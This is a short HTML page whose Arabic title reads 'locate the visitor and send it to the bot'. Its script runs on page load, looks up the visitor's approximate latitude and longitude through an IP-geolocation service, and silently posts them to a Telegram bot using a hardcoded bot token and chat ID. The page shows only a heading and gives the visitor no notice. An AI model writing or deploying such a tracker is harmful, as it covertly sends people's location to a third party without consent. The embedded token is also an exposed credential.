<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديد موقع الزائر وإرساله للبوت</title>
</head>
<body>
    <h1>تحديد موقع الزائر وإرساله للبوت</h1>

    <script>
        function getLocationAndSend() {
            fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                var latitude = data.latitude;
                var longitude = data.longitude;

                var token = '6845141846:AAHqQu5jJJuWzDb8YNAUyY-nWx7F5d08gxE';
                var chatId = '829549685';

                var message = 'New location: Latitude ' + latitude + ', Longitude ' + longitude;

                sendLocation(token, chatId, message);
            })
            .catch(error => {
                console.error('Error getting location:', error);
            });
        }

        function sendLocation(token, chatId, message) {
            var data = {
                chat_id: chatId,
                text: message
            };

            fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            })
            .then(response => {
                console.log('Location sent successfully');
            })
            .catch(error => {
                console.error('Error sending location:', error);
            });
        }

        getLocationAndSend();
    </script>
</body>
</html>
